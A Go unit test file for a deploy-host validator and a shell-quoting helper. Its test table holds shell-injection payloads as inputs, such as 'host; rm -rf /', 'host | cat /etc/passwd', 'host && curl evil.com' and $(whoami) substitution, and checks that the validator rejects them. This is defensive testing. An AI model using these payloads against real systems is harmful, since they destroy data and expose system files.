package config

import (
	"strings"
	"testing"
)

// TestValidateDeployHost covers the allowlist regex and whitespace rejection.
// Injection payloads are taken directly from the issue specification.
func TestValidateDeployHost(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
		wantMsg string // substring that must appear in the error, when wantErr is true
	}{
		// -- valid inputs
		{name: "empty is valid (placeholder path)", input: "", wantErr: false},
		{name: "plain domain", input: "example.com", wantErr: false},
		{name: "user at domain", input: "alice@host.example.com", wantErr: false},
		{name: "user at domain with port", input: "alice@host.example.com:2222", wantErr: false},
		{name: "bare IPv4", input: "1.2.3.4", wantErr: false},
		{name: "IPv4 with port", input: "1.2.3.4:22", wantErr: false},
		{name: "ssh config alias (no at-sign)", input: "my-server", wantErr: false},
		{name: "subdomain with hyphens", input: "user@sub-domain.example.com", wantErr: false},

		// -- injection attacks
		{
			// spaces in the payload trigger the whitespace check before the regex
			name:    "semicolon injection (with space)",
			input:   "host; rm -rf /",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "double-ampersand injection",
			input:   "host && curl evil.com",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "pipe injection (with space)",
			input:   "host | cat /etc/passwd",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "dollar-sign variable expansion",
			input:   "$(whoami)@host",
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			name:    "backtick command substitution",
			input:   "`whoami`@host",
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			name:    "shell variable expansion",
			input:   "$HOME@host",
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			// space after semicolon triggers whitespace check
			name:    "user with semicolon and space",
			input:   "user; foo@host",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "semicolon without space",
			input:   "host;evil",
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			name:    "embedded newline",
			input:   "host\necho injected",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "embedded tab",
			input:   "host\textra",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "space in middle",
			input:   "user@host example.com",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "carriage return",
			input:   "host\r",
			wantErr: true,
			wantMsg: "whitespace",
		},
		{
			name:    "redirect operator",
			input:   "host>file",
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			name:    "double-quote in value",
			input:   `host"evil`,
			wantErr: true,
			wantMsg: "is invalid",
		},
		{
			name:    "single-quote in value",
			input:   "host'evil",
			wantErr: true,
			wantMsg: "is invalid",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDeployHost(tt.input)
			if (err != nil) != tt.wantErr {
				t.Fatalf("ValidateDeployHost(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
			if tt.wantErr && tt.wantMsg != "" {
				if !strings.Contains(err.Error(), tt.wantMsg) {
					t.Errorf("ValidateDeployHost(%q) error = %q, want substring %q", tt.input, err.Error(), tt.wantMsg)
				}
			}
		})
	}
}

// TestShellQuoteSingleDeploy confirms that the quoting function wraps its
// argument in POSIX single-quotes.
func TestShellQuoteSingleDeploy(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"plain host", "example.com", "'example.com'"},
		{"user at host", "alice@host.example.com", "'alice@host.example.com'"},
		{"IPv4 with port", "1.2.3.4:22", "'1.2.3.4:22'"},
		{"placeholder value", "<your-ssh-user>@<your-ssh-host>", "'<your-ssh-user>@<your-ssh-host>'"},
		{"empty string", "", "''"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShellQuoteSingleDeploy(tt.input)
			if got != tt.want {
				t.Errorf("ShellQuoteSingleDeploy(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}
